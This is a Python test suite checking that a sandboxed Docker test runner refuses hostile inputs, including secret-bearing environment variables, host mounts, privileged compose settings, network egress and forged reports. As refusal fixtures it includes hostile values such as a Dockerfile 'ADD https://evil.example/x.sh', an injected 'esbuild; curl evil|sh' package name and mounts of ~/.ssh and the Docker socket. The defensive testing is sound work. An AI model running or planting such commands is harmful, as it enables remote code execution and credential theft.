#!/usr/bin/python3
"""Increment-7c suite: the confined runner's policy (hostile inputs per threat), the merged
product-plus-feature validators, and the rulings on increment 7b.

    /usr/bin/python3 tests/inc7c/run.py

Fixtures only. The runner's engine calls need a Docker engine that a sandboxed test process
cannot reach, and every base image is blocked by the licence ruling (docs/increment-7c-report.md),
so this suite checks the runner's decisions (argv, compose generation, Dockerfile, limits,
install scripts, output) and that it fails closed; it runs nothing in a container.
"""
import base64
import json
import os
import re
import shutil
import sys
import tempfile
import time

HERE = os.path.dirname(os.path.realpath(__file__))
REPO = os.path.dirname(os.path.dirname(HERE))
sys.path.insert(0, os.path.join(REPO, "tests", "lib"))
sys.path.insert(0, REPO)

import fixtures  # noqa: E402

E = fixtures.Env("v7c").build()
sys.path.insert(0, os.path.join(E.home, "gate", "v1"))
sys.path.insert(0, E.home)
os.environ.update(MOADIX_GUARD_ROOT=E.base, MOADIX_GUARD_REPO=REPO, MOADIX_GUARD_SHIM=E.shim)
import _testguard  # noqa: E402,F401
from gate import confined, pathmap, state  # noqa: E402

RESULTS = []
T0 = time.time()
FIX = os.path.join(REPO, "tests", "fixtures", "product", "sdlc")
D = "a" * 64


def record(group, name, ok, evidence=""):
    RESULTS.append((group, name, bool(ok)))
    print("%s  [%s] %s" % ("PASS" if ok else "FAIL", group, name))
    if not ok:
        print("      %s" % " ".join(str(evidence).split())[:1200])


def refused(fn, *a, **k):
    try:
        fn(*a, **k)
    except confined.Refused as e:
        return str(e)
    return None


def unavailable(fn, *a, **k):
    try:
        fn(*a, **k)
    except confined.Unavailable as e:
        return str(e)
    return None


LIM = confined.limits("E-test")
OKSVC = {"services": {"app": {"build": {"context": ".", "dockerfile": "Dockerfile"}, "command": ["node", "server.js"],
                              "environment": {"PORT": "3000", "DATABASE_URL": "postgres://moadix:x@postgres:5432/test"},
                              "expose": ["3000"], "ports": ["127.0.0.1:3000:3000"],
                              "volumes": ["data:/var/lib/app"]}},
         "volumes": {"data": {}}}


# ------------------------------------------------------------------ threat 1: secrets
def test_secrets():
    G = "T1 secrets"
    argv = confined.run_argv("r1", "img@sha256:" + D, ["npm", "test"], LIM, "moadix-r1-src", "moadix-r1-out")
    envs = [argv[i + 1] for i, a in enumerate(argv) if a == "--env"]
    record(G, "the run's environment is built from scratch: only PATH, HOME, LANG, CI, NODE_ENV, TZ",
           sorted(e.split("=", 1)[0] for e in envs) == ["CI", "HOME", "LANG", "NODE_ENV", "PATH", "TZ"], envs)
    for k in ("GH_TOKEN", "NPM_TOKEN", "DOTENV_PRIVATE_KEY", "AWS_SECRET_ACCESS_KEY", "DB_PASSWORD"):
        why = refused(confined.run_argv, "r1", "img@sha256:" + D, ["x"], LIM, "moadix-r1-src", "moadix-r1-out",
                      env={k: "v"})
        record(G, "hostile: passing %s into a confined run is refused" % k, why and k in why, why)
    bad = json.loads(json.dumps(OKSVC))
    bad["services"]["app"]["environment"]["API_TOKEN"] = "abc"
    why = refused(confined.compose_project, bad, "r1", LIM)
    record(G, "hostile: a compose service with a secret-looking variable is refused", why and "API_TOKEN" in why, why)
    bad["services"]["app"]["environment"] = {"PAYMENTS_URL": "https://api.stripe.com/v1"}
    why = refused(confined.compose_project, bad, "r1", LIM)
    record(G, "hostile: a compose service pointed at a real (non-test) host is refused", why and "non-test host" in why, why)
    why = refused(confined.build_argv, "r1", "t", "Dockerfile", LIM, {"build": {"args": {"NPM_TOKEN": "x"}}})
    record(G, "hostile: a build arg carrying a token is refused", why and "secret" in why, why)
    for txt, label in (("FROM n@sha256:%s\nRUN --mount=type=secret,id=npm cat /run/secrets/npm\n" % D, "a secret mount"),
                       ("FROM n@sha256:%s\nRUN --mount=type=ssh git clone git@github.com:o/r\n" % D, "an SSH mount")):
        p = confined.dockerfile_problems(txt)
        record(G, "hostile Dockerfile: %s is refused" % label, p and "no secrets" in p[0], p)


# ------------------------------------------------------------------ threat 2: gate state / threat 7: escalation
def test_mounts():
    G = "T2/T7 mounts and escalation"
    argv = confined.run_argv("r2", "img@sha256:" + D, ["true"], LIM, "moadix-r2-src", "moadix-r2-out")
    j = " ".join(argv)
    record(G, "the run is non-root, drops every capability, forbids new privileges, has a read-only root",
           "--user 10001:10001" in j and "--cap-drop ALL" in j and "no-new-privileges" in j and "--read-only" in j, j)
    record(G, "the source is a read-only named volume, the output the only writable one, no host path anywhere",
           "src=moadix-r2-src,dst=/src,readonly" in j and "src=moadix-r2-out,dst=/out" in j and " -v " not in j and
           "type=bind" not in j and "docker.sock" not in j, j)
    for vol in ("/Users/moad", "/var/run/docker.sock", "../x", "moadix-r2-src/../../etc"):
        why = refused(confined.run_argv, "r2", "img@sha256:" + D, ["true"], LIM, vol, "moadix-r2-out")
        record(G, "hostile: a source volume %r is refused (only gate-created named volumes)" % vol, bool(why), why)
    for key, val, label in (("privileged", True, "privileged"), ("cap_add", ["SYS_ADMIN"], "cap_add"),
                            ("devices", ["/dev/kvm"], "devices"), ("network_mode", "host", "host network"),
                            ("pid", "host", "host PID"), ("ipc", "host", "host IPC"),
                            ("extra_hosts", ["api.example.com:1.2.3.4"], "extra_hosts"),
                            ("user", "0:0", "a root user"), ("security_opt", ["seccomp:unconfined"], "security_opt"),
                            ("volumes_from", ["other"], "volumes_from")):
        bad = json.loads(json.dumps(OKSVC))
        bad["services"]["app"][key] = val
        why = refused(confined.compose_project, bad, "r2", LIM)
        record(G, "hostile compose: %s is refused" % label, why and "`%s`" % key in why, why)
    for vols, label in ((["/:/host"], "a host root bind"), (["/var/run/docker.sock:/var/run/docker.sock"], "the Docker socket"),
                        (["./src:/app"], "a relative host path"), (["~/.ssh:/root/.ssh"], "a home path"),
                        ([{"type": "bind", "source": "/etc", "target": "/etc"}], "a long-form bind")):
        bad = json.loads(json.dumps(OKSVC))
        bad["services"]["app"]["volumes"] = vols
        why = refused(confined.compose_project, bad, "r2", LIM)
        record(G, "hostile compose: %s is refused" % label, why and "host path" in why, why)
    bad = json.loads(json.dumps(OKSVC))
    bad["volumes"] = {"data": {"external": True}}
    why = refused(confined.compose_project, bad, "r2", LIM)
    record(G, "hostile compose: an external volume is refused", why and "external" in why, why)
    bad = dict(OKSVC, networks={"default": {"external": True}})
    why = refused(confined.compose_project, bad, "r2", LIM)
    record(G, "hostile compose: top-level networks are refused (the gate makes the only network)", why and "networks" in why, why)
    proj, notes = confined.compose_project(json.loads(json.dumps(OKSVC)), "r2", LIM)
    app = proj["services"]["app"]
    record(G, "control: an allowlisted compose file becomes a gate-generated, hardened project",
           app["user"] == "10001:10001" and app["cap_drop"] == ["ALL"] and app["read_only"] is True and
           proj["networks"]["moadix-r2"]["internal"] is True and "ports" not in app and
           app["volumes"] == ["moadix-r2-data:/var/lib/app"] and app["image"].startswith("moadix/"), json.dumps(proj)[:600])


# ------------------------------------------------------------------ threat 3: persistence / threat 6: forged results
def test_output():
    G = "T3/T6 output and persistence"
    d = tempfile.mkdtemp(dir=E.base)
    with open(os.path.join(d, "report.json"), "w") as f:
        json.dump({"ok": 1}, f)
    record(G, "control: a plain JSON report is accepted", not confined.check_output(d, 1 << 20), "")
    os.symlink(os.path.expanduser("~/.zshrc"), os.path.join(d, "zshrc"))
    p = confined.check_output(d, 1 << 20)
    record(G, "hostile: a symlink in the output (pointing at ~/.zshrc) is refused, so nothing is copied through it",
           p and "symbolic link" in p[0], p)
    os.unlink(os.path.join(d, "zshrc"))
    with open(os.path.join(d, "big.bin"), "wb") as f:
        f.write(b"0" * (2 << 20))
    p = confined.check_output(d, 1 << 20)
    record(G, "hostile: output above the size cap is refused", p and "cap" in p[0], p)
    os.unlink(os.path.join(d, "big.bin"))
    with open(os.path.join(d, "mutation.json"), "w") as f:
        f.write("PASS 100% mutation score\n")
    why = refused(confined.read_json_output, d, "mutation.json")
    record(G, "hostile: a report that is not the tool's JSON (a forged PASS line) is refused, not believed",
           why and "not JSON" in why, why)
    why = refused(confined.read_json_output, d, "junit.json")
    record(G, "hostile: a missing report is a refusal, never a pass", why and "wrote no" in why, why)


# ------------------------------------------------------------------ threat 4: egress / threat 8: production
def test_network():
    G = "T4/T8 network"
    argv = confined.run_argv("r4", "img@sha256:" + D, ["true"], LIM, "moadix-r4-src", "moadix-r4-out")
    record(G, "a Tier E run has --network none", argv[argv.index("--network") + 1] == "none", argv)
    for net in ("host", "bridge", "default", "container:x"):
        why = refused(confined.run_argv, "r4", "img@sha256:" + D, ["true"], LIM, "moadix-r4-src", "moadix-r4-out",
                      network=net)
        record(G, "hostile: network %s is refused (only none or the run's internal network)" % net, bool(why), why)
    bad = json.loads(json.dumps(OKSVC))
    bad["services"]["app"]["ports"] = ["0.0.0.0:3000:3000"]
    why = refused(confined.compose_project, bad, "r4", LIM)
    record(G, "hostile compose: a port published on 0.0.0.0 is refused", why and "outside loopback" in why, why)
    p = confined.dockerfile_problems("FROM n@sha256:%s\nADD https://evil.example/x.sh /x.sh\n" % D)
    record(G, "hostile Dockerfile: ADD <url> (a download during the build) is refused", p and "downloads" in p[0], p)
    a, envb = confined.build_argv("r4", "t", "Dockerfile", LIM)
    record(G, "the image build has --network none by default (BuildKit)", a[a.index("--network") + 1] == "none" and
           envb["DOCKER_BUILDKIT"] == "1", a)
    a, envb = confined.build_argv("r4", "t", "Dockerfile", LIM, {"build": {"network": "registry"}})
    record(G, "build.network: registry uses the run's egress network (classic builder), never the default bridge",
           a[a.index("--network") + 1] == "moadix-egress-r4" and envb["DOCKER_BUILDKIT"] == "0", a)
    why = refused(confined.build_argv, "r4", "t", "Dockerfile", LIM, {"build": {"network": "host"}})
    record(G, "hostile: build.network host is refused", bool(why), why)
    p = confined.dockerfile_problems("FROM node:24-slim\nRUN npm ci\n")
    record(G, "hostile Dockerfile: FROM without a digest is refused", p and "not pinned" in p[0], p)
    p = confined.dockerfile_problems("FROM n@sha256:%s AS build\nRUN x\nFROM build\n" % D)
    record(G, "control: FROM a digest and FROM an earlier stage pass", p == [], p)


# ------------------------------------------------------------------ threat 5: resources, ruling 5 and 6
def test_limits():
    G = "T5 resources (ruling 5) and install scripts (ruling 6)"
    record(G, "the defaults are section 3.5's (E-test: 2 CPUs, 4 GiB, 512 pids, 15 min)",
           LIM == {"cpus": 2, "memory_mb": 4096, "pids": 512, "tmp_mb": 1024, "out_mb": 200, "wall_s": 900}, LIM)
    ok = confined.limits("E-test", {"limits": {"E-test": {"memory_mb": 8192, "wall_s": 1800}}})
    record(G, "a product may raise a limit to 2x through ADOPT", ok["memory_mb"] == 8192 and ok["wall_s"] == 1800, ok)
    why = refused(confined.limits, "E-test", {"limits": {"E-test": {"memory_mb": 8193}}})
    record(G, "hostile: above 2x is refused", why and "above 2" in why, why)
    why = refused(confined.limits, "E-test", {"limits": {"E-test": {"privileged": 1}}})
    record(G, "hostile: a limit key that is not a limit is refused", why and "is not a limit" in why, why)
    argv = confined.run_argv("r5", "img@sha256:" + D, ["true"], LIM, "moadix-r5-src", "moadix-r5-out")
    j = " ".join(argv)
    record(G, "the limits reach the engine: --cpus, --memory = --memory-swap, --pids-limit, nofile, tmpfs size",
           "--cpus 2" in j and "--memory 4096m" in j and "--memory-swap 4096m" in j and "--pids-limit 512" in j and
           "nofile=4096" in j and "size=1024m" in j, j)
    record(G, "ruling 6: install scripts run only for packages the adopted product-tools.yaml lists",
           confined.install_scripts({"install_scripts": ["esbuild", "@swc/core"]}) == ["esbuild", "@swc/core"] and
           confined.install_scripts({}) == [], "")
    why = refused(confined.install_scripts, {"install_scripts": ["esbuild; curl evil|sh"]})
    record(G, "hostile: an install_scripts entry that is not a package name is refused", bool(why), why)


# ------------------------------------------------------------------ fail closed (ruling 1, ruling 2)
def test_fail_closed():
    G = "fail closed"
    # ruling 1 on increment 7d cleared all six images in the repository's configuration; a blocked image
    # (a variant of that configuration) must still give UNKNOWN with its reason
    repo_cfg = os.path.join(REPO, "gate", "config", "confinement.yaml")
    text = open(repo_cfg).read()
    names = ("node", "node-full", "python", "chromium", "zap", "postgres")
    saved_cfg = confined.CONFIG
    confined.CONFIG = repo_cfg
    cleared = {n: unavailable(confined.image, n) for n in names}
    record(G, "ruling 1 on increment 7d: all six images are cleared in the repository's configuration",
           not any(cleared.values()), cleared)
    blocked = os.path.join(E.base, "confinement-blocked.yaml")
    with open(blocked, "w") as f:
        f.write(re.sub(r"(?m)^    status: cleared$", "    status: blocked\n    reason: \"blocked for the fail-closed test\"", text))
    confined.CONFIG = blocked
    for name in names:
        why = unavailable(confined.image, name)
        record(G, "a blocked image (%s): UNKNOWN with the reason" % name, why and "blocked" in why, why)
    confined.CONFIG = saved_cfg
    saved = confined.DOCKER_DIRS
    saved_env = os.environ.pop("MOADIX_TEST_ENGINE", None)
    confined.DOCKER_DIRS = (os.path.join(E.base, "nowhere"),)
    ok, why = confined.docker_available()
    why2 = unavailable(confined.Run, "r6-fail-closed")
    confined.DOCKER_DIRS = saved
    if saved_env:
        os.environ["MOADIX_TEST_ENGINE"] = saved_env
    record(G, "ruling 1: no Docker -> UNKNOWN (never a run on the host)", not ok and "hard requirement" in why and
           why2 and "hard requirement" in why2, (why, why2))
    cfg = confined._yaml(confined.CONFIG)
    record(G, "every pinned image ref is by digest; Testcontainers and the Docker socket appear nowhere",
           all(confined.DIGEST_REF.match(str(e["ref"])) for e in cfg["images"].values() if e.get("ref")) and
           "testcontainers" not in open(confined.CONFIG).read().lower().replace("never testcontainers", ""), "")


# ------------------------------------------------------------------ the merged product-plus-feature validators
def line(p, pid, action, payload):
    hd = fixtures.sh([fixtures.GIT, "-C", p, "rev-parse", "HEAD"]).stdout.strip()
    pl = dict(payload, source_commit=hd)
    r = E.checker("record", "--product", pid, "--action", action, "--code", E.fresh(),
                  "--payload-b64", base64.b64encode(json.dumps(pl, sort_keys=True).encode()).decode())
    assert r.returncode == 0, r.stdout + r.stderr
    state.append_line(p, r.stdout.strip())
    state.write_phase(p, state.replay(pid, [json.loads(x["body"]) for x in E.ledger(p)]))


TM = ("# Threat model\n\n## Trust Boundaries\n\n| ID | Boundary | Description |\n|---|---|---|\n| TB-1 | browser to server | "
      "notes arrive |\n\n### SEC-001 - Stored XSS\n\n- **Trust boundary:** TB-1\n- **STRIDE:** Tampering\n- **Threat:** "
      "script in a note\n- **Mitigation requirement:** escape output\n- **Owner phase:** 7\n- **Verification method:** "
      "encoder unit test\n\n## Shared resources\n\n_none_ - stateless requests, one writer\n")
FTM = ("# Threat model additions\n\n### SEC-002 - Deleting another visitor's note\n\n- **Trust boundary:** TB-1\n"
       "- **STRIDE:** Tampering\n- **Threat:** id guess\n- **Mitigation requirement:** check ownership\n- **Owner phase:** 7\n")


def check_merged(p, label):
    r = fixtures.sh([fixtures.PY, "-I", os.path.join(E.home, "gate", "v1", "_launch.py"),
                     os.path.join(E.home, "gate", "v1", "check_merged.py"), "--phase", label], cwd=p,
                    env=E.env(MOADIX_PRODUCT_ROOT=p, MOADIX_GATE_RUN="yes"), timeout=300)
    return r.returncode, r.stdout + r.stderr


def test_merged():
    G = "merged validators"
    p = E.repo("merged", docs=("00-brd.md", "01-research.md", "02-prd.md"))
    E.write(p, "sdlc/04-threat-model.md", TM)
    E.commit(p, "docs")
    E.init(p, "mergedfx")
    for lab in pathmap.LABELS:
        line(p, "mergedfx", "APPROVE %s" % lab, {"phase": lab, "validation": {"verdict": "pass", "results": [],
                                                                              "digest": "sha256:x"}})
    line(p, "mergedfx", "FEATURE F1", {"feature": "F1", "id": "F1"})
    E.write(p, "sdlc/features/F1/04-threat-model.md", FTM + "- **Verification method:** a 403 test\n")
    E.commit(p, "feature tm")
    rc, out = check_merged(p, "4")
    record(G, "control: the feature's SEC-002 merged into the product threat model passes check-threat-model",
           rc == 0 and "check-threat-model passes on the merged product documents" in out, out)
    E.write(p, "sdlc/features/F1/04-threat-model.md", FTM)
    E.commit(p, "feature tm without a verification method")
    rc, out = check_merged(p, "4")
    record(G, "planted: an addition the full product validator rejects (SEC-002 with no verification method) fails "
              "the merged view", rc == 1 and "check-threat-model (merged with feature F1)" in out and "SEC-002" in out, out)
    E.write(p, "sdlc/features/F1/00-brd.md", "# BRD additions\n\n- **Size:** M\n\n## Business Goals\n\n| ID | Goal | Metric "
                                            "| Priority |\n|---|---|---|---|\n| BG-2 | remove notes | removals | must |\n")
    E.commit(p, "feature brd")
    rc, out = check_merged(p, "0")
    record(G, "control: the merged BRD passes check-handoff-0", rc == 0 and "check-handoff-0 passes" in out, out)
    os.makedirs(os.path.join(p, "sdlc", "05-lld"), exist_ok=True)
    E.write(p, "sdlc/05-lld/api.md", "x\n")
    E.write(p, "sdlc/features/F1/05-lld/api.md", "y\n")
    E.commit(p, "colliding lld")
    rc, out = check_merged(p, "5")
    record(G, "planted: a feature LLD file that would overwrite the product's fails (the merge would collide)",
           rc == 1 and "cannot be merged" in out, out)
    q = E.repo("merged-none", docs=("00-brd.md",))
    E.init(q, "mnfx")
    rc, out = check_merged(q, "0")
    record(G, "outside a feature cycle it has nothing to do (the product's own validators judge the product)",
           rc == 0 and "no feature cycle" in out, out)
    import hlib
    reg = {c["id"]: c for c in hlib.load_yaml(os.path.join(REPO, "gate", "config", "registry.yaml"))["components"]}
    record(G, "registered in feature scope for the merged phases 0-6b (7 and later are not merged)",
           all(reg.get("check-merged-%s" % x, {}).get("scope") == "feature" for x in ("0", "1", "2", "3", "4", "5", "6b"))
           and not any(k.startswith("check-merged-") and k[13:] not in ("0", "1", "2", "3", "4", "5", "6b") for k in reg), "")


# ------------------------------------------------------------------ rulings 3, 4 and the design gaps
def test_rulings():
    G = "rulings"
    amd = open(os.path.join(REPO, "docs", "AMENDMENT-3.md")).read()
    cat = open(os.path.join(REPO, "gate", "config", "coverage-topics.yaml")).read()
    tools = open(os.path.join(REPO, "gate", "config", "tools.yaml")).read()
    record(G, "ruling 3: Testcontainers is out of the tool table and the pins, with its one-line reason",
           "| Testcontainers" not in amd and "Testcontainers was removed from this table" in amd and
           "name: testcontainers" not in tools.lower(), "")
    record(G, "ruling 4: H20 and the phase-3 gate name .dependency-cruiser.json, JSON only, in the amendment and catalogue",
           ".dependency-cruiser.json" in amd and ".dependency-cruiser.cjs" not in amd and ".dependency-cruiser.json" in cat and
           ".dependency-cruiser.cjs" not in cat and "JSON only" in cat, "")
    des = open(os.path.join(REPO, "docs", "confinement-design.md")).read()
    record(G, "the design closes gap 7 (compose generated from an allowlist) and gap 8 (the confined image build)",
           "### 3.8 The product's compose file is never run as written" in des and "### 3.9 Building the app image" in des
           and "Accepted risks of the build" in des, "")


def main():
    try:
        for t in (test_secrets, test_mounts, test_output, test_network, test_limits, test_fail_closed, test_merged,
                  test_rulings):
            try:
                t()
            except Exception as e:
                import traceback
                record(t.__name__, "group ran to the end", False, "%s: %s\n%s" % (type(e).__name__, e,
                                                                                 traceback.format_exc()[-1500:]))
        viol = E.violations()
        record("guard", "no test read, wrote or started a real product, keychain or ~/.claude", not viol, viol)
    finally:
        E.remove()
    n = len(RESULTS)
    bad = [r for r in RESULTS if not r[2]]
    for g, name, _ok in bad:
        print("FAILED [%s] %s" % (g, name))
    print("\n%d checks, %d passed, %d failed (%d s)" % (n, n - len(bad), len(bad), time.time() - T0))
    return 1 if bad else 0


if __name__ == "__main__":
    sys.exit(main())
